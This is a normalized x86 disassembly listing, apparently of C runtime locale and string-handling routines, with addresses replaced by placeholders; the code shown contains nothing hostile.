call sub_41fc00
push ebx
call sub_41a3a5
mov eax [ ebp - 0x8 ]
push eax
call sub_41a3a5
mov eax [ ebp - 0xc ]
push eax
call sub_41a3a5
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ ebx + 0x88 ]
call sub_41a3a5
push [ ebx + 0x7c ]
call sub_41a3a5
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebx + 0x88 ]
xor ecx ecx
mov esi [ ebp - 0x4 ]
inc ecx
mov edi [ ebp - 0xc ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x30 ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x34 ]
mov [ esi + 0x34 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] ecx
test edi edi
je r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_4200ba
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a3a5
pop ecx
push eax
call sub_41a3a5
pop ecx
sub_420123
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
push esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] eax
cmp [ ebx + 0xb0 ] eax
jne r-xdata
xor esi esi
inc esi
push 0x50
push esi
mov [ ebp - 0xc ] esi
call sub_41942e
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebx + 0xac ] eax
jne r-xdata
mov esi [ ebx + 0x88 ]
mov edi eax
push 0x14
pop ecx
[ edi ] [ esi ]
push 0x4
call sub_419b3e
mov esi eax
xor edi edi
push edi
mov [ ebp - 0x8 ] esi
call sub_41a3a5
pop ecx
pop ecx
test esi esi
jne r-xdata
mov eax esi
jmp r-xdata
mov edi eax
mov [ ebp - 0x8 ] eax
mov esi rw-data
jmp r-xdata
mov [ esi ] edi
cmp [ ebx + 0xb0 ] edi
je r-xdata
push [ ebp - 0x4 ]
call sub_41a3a5
xor eax eax
pop ecx
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ rw-data ]
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax [ rw-data ]
mov [ esi + 0x30 ] eax
mov eax [ rw-data ]
mov [ esi + 0x34 ] eax
jmp r-xdata
push 0x4
call sub_419b3e
mov esi eax
push edi
mov [ ebp - 0x10 ] esi
call sub_41a3a5
pop ecx
pop ecx
test esi esi
je r-xdata
mov ecx [ ebx + 0x7c ]
test ecx ecx
je r-xdata
[ eax ]
mov ecx [ ebp - 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
test edi edi
je r-xdata
push [ ebp - 0x4 ]
call sub_41a3a5
mov ecx [ ebp - 0x8 ]
push ecx
call sub_41a3a5
mov eax [ ebp - 0xc ]
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
mov [ esi ] edi
lea eax [ ebp - 0x18 ]
mov edi [ ebx + 0xb0 ]
push 0xe
push edi
push 0x1
push eax
call sub_422afe
mov ecx [ ebp - 0x4 ]
mov esi eax
add ecx 0x4
lea eax [ ebp - 0x18 ]
push ecx
push 0xf
push edi
push 0x1
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
push 0x10
push edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_422afe
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x30
push eax
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_422afe
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x34
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_422afe
add esp 0x14
or eax esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x7c ] eax
xor eax eax
mov [ ebx + 0x80 ] edi
mov [ ebx + 0x88 ] esi
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
mov [ edi ] eax
mov edx [ ebp - 0xc ]
mov edx [ edx ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_4200ba
or [ ebp - 0xc ] 0xffffffff
pop ecx
push [ ebx + 0x7c ]
call sub_41a3a5
push [ ebx + 0x88 ]
call sub_41a3a5
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
mov edi [ ebp - 0x10 ]
mov esi [ ebp - 0x4 ]
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_42033f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
lea eax [ esi + eax * 4 ]
mov ecx eax
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp eax esi
sbb ebx ebx
not ebx
and ebx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push [ esi ]
call sub_41a3a5
inc edi
lea esi [ esi + 0x4 ]
pop ecx
cmp edi ebx
jne r-xdata
sub_42037b
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ eax + 0xb4 ]
push edi
push esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x14 ] eax
call sub_418137
pop ecx
mov ecx [ ebp + 0x8 ]
xor ebx ebx
push 0x31
mov [ ecx + 0x160 ] eax
pop eax
push 0x7
pop edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
push 0x7
pop edi
add eax 0xffffffd0
xor edx edx
div edi
mov edi edx
lea eax [ ecx + edi * 4 ]
push eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push esi
push 0x1
push eax
call sub_422afe
mov esi [ ebp - 0x4 ]
or ebx eax
mov eax [ ebp + 0x8 ]
add esi 0xfffffff9
lea eax [ eax + edi * 4 ]
add eax 0x1c
push eax
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_422afe
or ebx eax
mov eax [ ebp + 0x8 ]
lea eax [ eax + edi * 4 ]
add eax 0xb4
push eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push [ ebp - 0x8 ]
push 0x2
push eax
call sub_422afe
or ebx eax
mov eax [ ebp + 0x8 ]
lea eax [ eax + edi * 4 ]
mov edi [ ebp - 0x8 ]
add eax 0xd0
push eax
push esi
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_422afe
or ebx eax
add esp 0x50
mov eax [ ebp - 0x4 ]
inc eax
sub [ ebp - 0xc ] 0x1
mov [ ebp - 0x4 ] eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi edi
mov eax [ ebp + 0x8 ]
push 0x38
pop esi
add eax 0x68
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] 0xc
add eax 0xffffffd0
add esi 0xc
push eax
push esi
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_422afe
push [ ebp - 0x4 ]
or ebx eax
lea eax [ ebp - 0x14 ]
push [ ebp - 0x8 ]
push edi
push 0x1
push eax
call sub_422afe
or ebx eax
mov eax [ ebp - 0x4 ]
add eax 0x84
push eax
push esi
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_422afe
mov esi [ ebp - 0x8 ]
or ebx eax
mov eax [ ebp - 0x4 ]
add eax 0xb4
push eax
push esi
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_422afe
or ebx eax
add esp 0x50
mov eax [ ebp - 0x4 ]
add eax 0x4
inc esi
sub [ ebp - 0xc ] 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] esi
jne r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x98 ]
push eax
push 0x28
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_422afe
or ebx eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_422afe
or ebx eax
lea eax [ esi + 0x14c ]
push eax
push 0x28
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_422afe
or ebx eax
lea eax [ esi + 0x150 ]
push eax
push 0x29
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_422afe
add esp 0x50
or ebx eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_422afe
or ebx eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_422afe
or ebx eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_422afe
or ebx eax
lea eax [ esi + 0xac ]
push eax
push 0x1009
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_422afe
add esp 0x50
or ebx eax
lea eax [ esi + 0x154 ]
push eax
push 0x1f
push edi
push 0x2
lea eax [ ebp - 0x14 ]
push eax
call sub_422afe
or ebx eax
lea eax [ esi + 0x158 ]
push eax
push 0x20
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_422afe
or ebx eax
lea eax [ esi + 0x15c ]
push eax
push 0x1003
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_422afe
add esp 0x3c
or eax ebx
neg eax
sbb eax eax
pop edi
pop esi
inc eax
pop ebx
mov esp ebp
pop ebp
retn
sub_4205f8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push 0x7
push esi
call sub_42033f
lea eax [ esi + 0x1c ]
push 0x7
push eax
call sub_42033f
lea eax [ esi + 0x38 ]
push 0xc
push eax
call sub_42033f
lea eax [ esi + 0x68 ]
push 0xc
push eax
call sub_42033f
lea eax [ esi + 0x98 ]
push 0x2
push eax
call sub_42033f
push [ esi + 0xa0 ]
call sub_41a3a5
push [ esi + 0xa4 ]
call sub_41a3a5
push [ esi + 0xa8 ]
call sub_41a3a5
lea eax [ esi + 0xb4 ]
push 0x7
push eax
call sub_42033f
lea eax [ esi + 0xd0 ]
push 0x7
push eax
call sub_42033f
add esp 0x44
lea eax [ esi + 0xec ]
push 0xc
push eax
call sub_42033f
lea eax [ esi + 0x11c ]
push 0xc
push eax
call sub_42033f
lea eax [ esi + 0x14c ]
push 0x2
push eax
call sub_42033f
push [ esi + 0x154 ]
call sub_41a3a5
push [ esi + 0x158 ]
call sub_41a3a5
push [ esi + 0x15c ]
call sub_41a3a5
push [ esi + 0x160 ]
call sub_41a3a5
add esp 0x28
sub_4206dc
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0xb4 ] 0x0
jne r-xdata
push 0x164
push 0x1
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov esi r--data
jmp r-xdata
push edi
push esi
call sub_42037b
pop ecx
pop ecx
test al al
jne r-xdata
push eax
call sub_41a3a5
jmp r-xdata
push [ edi + 0x9c ]
call sub_420b67
mov [ edi + 0x9c ] esi
xor eax eax
push 0x0
mov [ esi + 0xb0 ] 0x1
call sub_41a3a5
pop ecx
push esi
call sub_4205f8
push esi
call sub_41a3a5
pop ecx
xor eax eax
inc eax
jmp r-xdata
pop ecx
pop edi
pop esi
pop ebp
retn
sub_42075b
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
push ebx
push esi
push edi
mov eax ecx
cmp [ ecx ] dx
je r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0xc ]
movzx ebx [ edi ]
add eax 0x2
cmp [ eax ] dx
jne r-xdata
movzx edx [ eax ]
mov [ ebp - 0x4 ] edx
mov edx ebx
mov esi edi
test bx bx
je r-xdata
add esi 0x2
movzx edx [ esi ]
test dx dx
jne r-xdata
cmp [ ebp - 0x4 ] dx
je r-xdata
xor edx edx
sub_4207ab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
pop ebp
retn
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop esi
pop ebp
retn
movzx esi [ edx ]
test si si
je r-xdata
cmp si [ ecx ]
jne r-xdata
add edx 0x2
add ecx 0x2
jmp r-xdata
sub eax 0x1
je r-xdata
sub_4207e5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
push esi
push edi
cmp [ eax ] cx
je r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
movzx edi [ esi ]
add eax 0x2
xor ecx ecx
cmp [ eax ] cx
jne r-xdata
movzx ebx [ eax ]
mov edx edi
mov ecx esi
test di di
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add ecx 0x2
movzx edx [ ecx ]
test dx dx
jne r-xdata
cmp dx bx
je r-xdata
sub_42082a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_414048
mov ecx [ ebp + 0x1c ]
test ecx ecx
jne r-xdata
xor eax eax
xor edi edi
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov ecx eax
mov [ ebp + 0x1c ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x8 ]
cmp ebx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax edi
lea esp [ ebp - 0x24 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
and [ eax + 0x350 ] 0xfffffffd
mov esi edi
lea ecx [ ebx + 0x8 ]
cmp ebx ecx
sbb eax eax
and eax ecx
lea ecx [ ebx + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_40f0cb
pop ecx
push ebx
push edi
push esi
call sub_411230
add esp 0xc
push [ ebp - 0x8 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp ebx ecx
sbb eax eax
and eax ecx
push eax
call sub_419b3e
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp ebx ecx
sbb eax eax
and eax ecx
call sub_4297c0
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_420947
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
[ eax + 0xc ]
mov ecx [ eax + 0x7c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x84 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x80 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
[ ecx ]
push esi
push 0x6
lea ecx [ eax + 0x28 ]
pop esi
[ ecx ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edx [ ecx ]
test edx edx
je r-xdata
add ecx 0x10
sub esi 0x1
jne r-xdata
mov edx [ ecx - 0x4 ]
test edx edx
je r-xdata
[ edx ]
cmp [ ecx - 0x8 ] rw-data
je r-xdata
push [ eax + 0x9c ]
call sub_420b0e
pop ecx
pop esi
pop ebp
retn
[ edx ]
sub_4209c4
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
push [ esi + 0x9c ]
call sub_420b37
pop ecx
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
mov [ ebp - 0x4 ] eax
lea edi [ esi + 0x28 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esi + 0x90 ]
sub eax 0xfe
push eax
call sub_41a3a5
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_41a3a5
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_41a3a5
push [ esi + 0x8c ]
call sub_41a3a5
add esp 0x10
cmp [ eax ] 0x0
jne r-xdata
add ebx 0x4
add edi 0x10
sub eax 0x1
mov [ ebp - 0x4 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_41a3a5
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_41a3a5
push [ ebx ]
call sub_41a3a5
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_41a3a5
pop ecx
push [ esi + 0x7c ]
call sub_41a3a5
push [ esi + 0x88 ]
call sub_41a3a5
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_41a3a5
push [ esi + 0x88 ]
call sub_41fc00
pop ecx
pop ecx
push eax
call sub_41a3a5
push [ esi + 0x88 ]
call sub_4200ba
pop ecx
pop ecx
sub_420b0e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
pop ebp
retn
cmp ecx r--data
je r-xdata
xor eax eax
inc eax
[ ecx + 0xb0 ] eax
inc eax
pop ebp
retn
sub_420b37
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
cmp esi r--data
je r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
jne r-xdata
push esi
call sub_4205f8
push esi
call sub_41a3a5
pop ecx
pop ecx
sub_420b67
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
pop ebp
retn
cmp ecx r--data
je r-xdata
or eax 0xffffffff
[ ecx + 0xb0 ] eax
dec eax
pop ebp
retn
sub_420b90
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
[ eax + 0xc ]
mov ecx [ eax + 0x7c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x84 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x80 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
[ ecx ]
push esi
push 0x6
lea ecx [ eax + 0x28 ]
pop esi
[ ecx ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edx [ ecx ]
test edx edx
je r-xdata
add ecx 0x10
sub esi 0x1
jne r-xdata
mov edx [ ecx - 0x4 ]
test edx edx
je r-xdata
[ edx ]
cmp [ ecx - 0x8 ] rw-data
je r-xdata
push [ eax + 0x9c ]
call sub_420b67
pop ecx
pop esi
[ edx ]
sub_420c11
push 0xc
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
call sub_41aa93
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x350 ] ecx
je r-xdata
push 0x4
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ edi + 0x4c ]
push eax
call sub_420c88
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420c77
test esi esi
jne r-xdata
mov esi [ edi + 0x4c ]
test esi esi
jne r-xdata
mov eax esi
call sub_40e2e6
retn
call sub_419afb
sub_420c88
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edi [ eax ]
cmp edi esi
jne r-xdata
push esi
mov [ eax ] esi
call sub_420947
pop ecx
test edi edi
je r-xdata
mov eax esi
jmp r-xdata
push edi
call sub_420b90
cmp [ edi + 0xc ] 0x0
pop ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
cmp edi rw-data
je r-xdata
push edi
call sub_4209c4
pop ecx
jmp r-xdata
sub_420cd8
mov edi edi
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0xb0 ]
push 0x55
push eax
or [ esi + 0x8 ] 0x104
call sub_41c0fd
cmp eax 0x1
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0xb0 ]
push edi
lea edx [ ecx + 0x2 ]
xor edi edi
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea eax [ esi + 0x250 ]
push 0x55
push eax
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_413b2e
int3
pop edi
sub_420d61
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
push 0x2
pop edx
mov ecx [ esi ]
mov [ ebp - 0x4 ] ebx
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor ebx ebx
sar ecx 0x1
cmp ecx 0x3
mov ecx [ esi + 0x4 ]
sete bl
mov [ esi + 0x10 ] ebx
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax [ ebp - 0x4 ]
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x14 ] eax
test ebx ebx
jne r-xdata
xor ebx ebx
mov [ esi + 0xc ] edx
push ebx
push ebx
push 0x3
push sub_420e8a
call sub_41becb
mov ecx [ esi + 0x8 ]
test cl 0x7
setne dl
bt ecx 0x9
setb al
and dl al
bt ecx 0x8
setb al
test al dl
jne r-xdata
push [ esi ]
call sub_420e56
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x8 ] ebx
sub_420dfb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
push 0x2
pop edx
mov ecx [ esi ]
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x10 ] eax
test eax eax
jne r-xdata
push ebx
push ebx
push 0x3
push sub_421174
mov [ esi + 0xc ] edx
call sub_41becb
test [ esi + 0x8 ] 0x4
jne r-xdata
push [ esi ]
call sub_420e56
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi + 0x8 ] ebx
sub_420e56
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
test ecx ecx
jne r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
sub_420e8a
mov edi edi
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_41aa93
mov esi eax
lea eax [ ebp - 0x84 ]
push 0x40
push eax
mov ecx [ esi + 0x64 ]
neg ecx
sbb ecx ecx
and ecx 0xfffff005
add ecx 0x1002
push ecx
push edi
call sub_41c093
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x54 ]
call sub_424d11
xor ebx ebx
mov [ ebp - 0x88 ] ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x58 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x58 ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0x40
lea eax [ ebp - 0x84 ]
push eax
mov eax [ esi + 0x60 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call sub_41c093
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x58 ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ esi + 0x60 ]
lea eax [ ebp - 0x84 ]
neg ecx
push 0x40
sbb ecx ecx
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push edi
call sub_41c093
test eax eax
jne r-xdata
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x50 ]
call sub_424d11
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x58 ] ebx
jmp r-xdata
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x50 ]
call sub_424d11
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi + 0x58 ] ebx
test [ esi + 0x58 ] 0x2
jne r-xdata
or [ esi + 0x58 ] 0x304
mov ecx edi
lea edx [ ecx + 0x2 ]
xor eax eax
inc eax
jmp r-xdata
or [ esi + 0x58 ] 0x200
mov edx [ esi + 0x58 ]
cmp [ esi + 0x60 ] ebx
je r-xdata
pop ebx
cmp [ esi + 0x5c ] ebx
je r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edi
lea eax [ esi + 0x2a0 ]
push 0x55
push eax
call sub_41f7c7
add esp 0x10
test eax eax
je r-xdata
cmp [ esi + 0x5c ] ebx
je r-xdata
or edx 0x100
mov [ esi + 0x58 ] edx
lea edx [ esi + 0x2a0 ]
cmp [ edx ] bx
jne r-xdata
test [ esi + 0x58 ] 0x1
jne r-xdata
push [ esi + 0x5c ]
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x50 ]
call sub_427831
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
or edx 0x100
mov [ esi + 0x58 ] edx
lea edx [ esi + 0x2a0 ]
cmp [ edx ] bx
jne r-xdata
mov ecx [ esi + 0x50 ]
lea ebx [ ecx + 0x2 ]
mov ecx edi
lea ebx [ ecx + 0x2 ]
push edi
call sub_42131c
pop ecx
test eax eax
je r-xdata
or [ esi + 0x58 ] 0x2
mov ecx edi
lea edx [ ecx + 0x2 ]
push ebx
push ebx
push ebx
push ebx
push ebx
mov ecx edi
